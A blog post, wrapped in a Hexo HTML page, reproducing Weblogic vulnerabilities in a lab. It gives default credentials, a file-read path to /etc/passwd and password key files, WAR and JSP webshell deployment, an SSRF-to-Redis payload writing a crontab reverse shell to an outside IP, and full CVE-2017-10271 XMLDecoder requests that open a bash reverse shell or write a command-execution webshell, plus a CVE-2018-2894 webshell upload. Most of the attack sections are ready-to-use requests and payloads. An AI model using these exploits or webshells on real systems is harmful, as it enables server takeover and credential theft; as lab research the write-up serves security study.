@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Weblogic," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="weak_password访问漏洞url： https://cirt.net/passwords?criteria=weblogic 默认账号密码:weblogic  Oracle@123 访问console进入后台登陆页面,进入后台的方式一般是弱口令登陆,如果没有弱口令,可以配合前台文件读取来获取配置文件对密码进行解密。这里提供了一个前台文件读取,访问http://192.168.181.12">
+<meta name="keywords" content="Weblogic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic 漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2018/11/12/Weblogic 漏洞复现/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="weak_password访问漏洞url： https://cirt.net/passwords?criteria=weblogic 默认账号密码:weblogic  Oracle@123 访问console进入后台登陆页面,进入后台的方式一般是弱口令登陆,如果没有弱口令,可以配合前台文件读取来获取配置文件对密码进行解密。这里提供了一个前台文件读取,访问http://192.168.181.12">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.33.47-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.26.48-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.28.21-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.52.53-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.54.10-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.56.15-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.57.55-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.50.54-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.37.33-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.38.55-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.47.34-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.30.17-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.54.09-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.56.33-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.14.59.13-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.44.08-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.41.24-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.51.55-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.38.58-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.39.26-image.png">
+<meta property="og:updated_time" content="2018-11-12T04:04:58.652Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic 漏洞复现">
+<meta name="twitter:description" content="weak_password访问漏洞url： https://cirt.net/passwords?criteria=weblogic 默认账号密码:weblogic  Oracle@123 访问console进入后台登陆页面,进入后台的方式一般是弱口令登陆,如果没有弱口令,可以配合前台文件读取来获取配置文件对密码进行解密。这里提供了一个前台文件读取,访问http://192.168.181.12">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.33.47-image.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/12/Weblogic 漏洞复现/"/>
+
+
+
+
+
+  <title>Weblogic 漏洞复现 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/12/Weblogic 漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Weblogic 漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-12T08:15:41+08:00">
+                2018-11-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><p>访问漏洞url：</p>
+<pre><code>https://cirt.net/passwords?criteria=weblogic
+默认账号密码:weblogic  Oracle@123
+</code></pre><p>访问<code>console</code>进入后台登陆页面,进入后台的方式一般是弱口令登陆,如果没有弱口令,可以配合前台文件读取来获取配置文件对密码进行解密。<br>这里提供了一个前台文件读取,访问<code>http://192.168.181.129:7001/hello/file.jsp?path=/etc/passwd</code>,在浏览器访问可直接下载,在burp中可对文件进行读取。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.33.47-image.png" alt="2018-11-11.15.33.47-image.png"></p>
+<h4 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h4><p>Weblogic密码使用AES(老版本3DES)加密,对称加密可解密,只需要找到用户的密文及加密密钥即可。这两个文件均位于<code>base_domain</code>下,名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>,在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>(基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>)<br>读取密钥:<br><code>SerializedSystemIni.dat</code>是一个二进制文件,所以必须用burp进行读取,浏览器直接下载可能造成乱码,我们在burp中右键保存为文件即可<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.26.48-image.png" alt="2018-11-11.15.26.48-image.png"></p>
+<p>读取密文:<br><code>config.xml</code>是base_domain的全局配置文件,其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值即为加密后的管理员密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.15.28.21-image.png" alt="2018-11-11.15.28.21-image.png"></p>
+<p>解密:</p>
+<pre><code>1.dat文件
+{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=
+</code></pre><p>登陆上去部署getshell:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.52.53-image.png" alt="2018-11-11.16.52.53-image.png"></p>
+<p>点击安装后,选择上载文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.54.10-image.png" alt="2018-11-11.16.54.10-image.png"></p>
+<p>打包war文件(当前目录下有shell文件z.jsp)    </p>
+<pre><code>jar -cvf zzz.war *
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.56.15-image.png" alt="2018-11-11.16.56.15-image.png"></p>
+<p>得到war文件,上载成功后一直点下一步至完成即可<br>最后得到:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.57.55-image.png" alt="2018-11-11.16.57.55-image.png"></p>
+<p>访问我们的shell：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.16.50.54-image.png" alt="2018-11-11.16.50.54-image.png"></p>
+<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>访问漏洞地址:    </p>
+<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp
+</code></pre><p>服务存在:    </p>
+<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.181.129:7001
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.37.33-image.png" alt="2018-11-11.11.37.33-image.png"></p>
+<p>服务不存在:    </p>
+<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.181.129:7002    
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.38.55-image.png" alt="2018-11-11.11.38.55-image.png"></p>
+<p>通过内网探测redis服务器,(docker的网段一般是<code>172.*</code>),发现<code>172.21.0.2:6379</code>可以连通。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.11.47.34-image.png" alt="2018-11-11.11.47.34-image.png"></p>
+<p>redis服务存在,我们可利用ssrf攻击内网中的redis服务器来反弹shell(<code>%0D%0A</code>分割命令)    </p>
+<p>发送3条命令：    </p>
+<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/x.x.x.x/22 0&gt;&amp;1\n\n\n\n&quot;
+config set dir /etc/
+config set dbfilename crontab
+save
+</code></pre><p>经过url编码:    </p>
+<pre><code>aa%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.206.20.104%2F22%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
+</code></pre><p>payload：    </p>
+<pre><code>http://192.168.181.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.21.0.2:6379/aa%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.206.20.104%2F22%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
+</code></pre><p>成功反弹shell：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.30.17-image.png" alt="2018-11-11.12.30.17-image.png"></p>
+<h2 id="XMLDecoder反序列化漏洞-CVE-2017-10271"><a href="#XMLDecoder反序列化漏洞-CVE-2017-10271" class="headerlink" title="XMLDecoder反序列化漏洞_CVE-2017-10271"></a>XMLDecoder反序列化漏洞_CVE-2017-10271</h2><p>访问url:    </p>
+<pre><code>http://192.168.181.129:7001/wls-wsat/CoordinatorPortType
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.54.09-image.png" alt="2018-11-11.12.54.09-image.png"><br>看到这个页面,则说明可能存在此漏洞    </p>
+<p>构造数据包:    </p>
+<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.181.129:7001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: JSESSIONID=RfdGbnjhgpxTT7ThQ6hnYQKzLkLBjFLvGp1n10zpvypLKBYkHGkY!-709784728
+Connection: close
+Content-Type: text/xml
+Content-Length: 637
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
+&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+&lt;void index=&quot;0&quot;&gt;
+&lt;string&gt;/bin/bash&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index=&quot;1&quot;&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index=&quot;2&quot;&gt;
+&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/22 0&amp;gt;&amp;amp;1&lt;/string&gt;  
+&lt;/void&gt;
+&lt;/array&gt;
+&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
+&lt;/java&gt;
+&lt;/work:WorkContext&gt;
+&lt;/soapenv:Header&gt;
+&lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre><p>注意:    </p>
+<pre><code>Content-Type: text/xml
+</code></pre><p>反弹shell成功：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.12.56.33-image.png" alt="2018-11-11.12.56.33-image.png"></p>
+<p>写shell:    </p>
+<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.181.129:7001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: JSESSIONID=RfdGbnjhgpxTT7ThQ6hnYQKzLkLBjFLvGp1n10zpvypLKBYkHGkY!-709784728
+Connection: close
+Content-Type: text/xml
+Content-Length: 637
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+    &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
+    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
+    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
+    &lt;![CDATA[
+&lt;%
+if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))
+{
+    java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;z&quot;)).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&quot;&lt;pre&gt;&quot;);
+    while((a=in.read(b))!=-1)
+    {
+        out.println(new String(b));
+    }
+    out.print(&quot;&lt;/pre&gt;&quot;);
+}
+%&gt;
+    ]]&gt;
+    &lt;/string&gt;
+    &lt;/void&gt;
+    &lt;void method=&quot;close&quot;/&gt;
+    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
+    &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+    &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre><p>然后带密码访问:    </p>
+<pre><code>http://192.168.181.129:7001/bea_wls_internal/test.jsp
+POST:pwd=123&amp;z=ipconfig
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.14.59.13-image.png" alt="2018-11-11.14.59.13-image.png"></p>
+<h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p>需要开启Web Service Test Page,但是默认是不开启的,所以有一定的限制,利用该漏洞可直接上传webshell,获取服务器权限</p>
+<p>在docker中查看管理员密码:</p>
+<pre><code>docker-compose logs | grep password
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.44.08-image.png" alt="2018-11-11.17.44.08-image.png"></p>
+<p>得到账户密码:</p>
+<pre><code>weblogic     nnXPlDo0
+</code></pre><p>访问<code>http://192.168.181.129:7001/console</code><br>点击<code>base_domain</code>配置,在高级中开启<code>&quot;启用Web服务测试页&quot;</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.41.24-image.png" alt="2018-11-11.17.41.24-image.png"></p>
+<p>点击保存后,访问<code>http://192.168.181.129:7001/ws_utc/config.do</code><br>将<code>Work Home Dir</code>改为:<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。访问这个目录是不需要权限的。这一点对我们访问我们的shell文件很重要。    </p>
+<p>保存完成后,点击<code>安全</code>–&gt;增加,然后上传webshell:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.51.55-image.png" alt="2018-11-11.17.51.55-image.png"></p>
+<p>上传查看返回包,得到时间戳(后面会用)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.38.58-image.png" alt="2018-11-11.17.38.58-image.png"></p>
+<p>访问我们的shell:</p>
+<pre><code>http://192.168.181.129:7001/ws_utc/css/config/keystore/1541928959531_z.jsp
+pwd=023&amp;z=id
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-11.17.39.26-image.png" alt="2018-11-11.17.39.26-image.png"></p>
+<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>还没复现,先放这里</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Weblogic/" rel="tag"># Weblogic</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/08/java_web_xml/" rel="next" title="基础知识 | XML基础">
+                <i class="fa fa-chevron-left"></i> 基础知识 | XML基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#weak-password"><span class="nav-number">1.</span> <span class="nav-text">weak_password</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#读取后台用户密文与密钥文件"><span class="nav-number">1.0.1.</span> <span class="nav-text">读取后台用户密文与密钥文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf"><span class="nav-number">2.</span> <span class="nav-text">ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XMLDecoder反序列化漏洞-CVE-2017-10271"><span class="nav-number">3.</span> <span class="nav-text">XMLDecoder反序列化漏洞_CVE-2017-10271</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）"><span class="nav-number">4.</span> <span class="nav-text">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2018-2628"><span class="nav-number">5.</span> <span class="nav-text">CVE-2018-2628</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2018-3191"><span class="nav-number">6.</span> <span class="nav-text">CVE-2018-3191</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
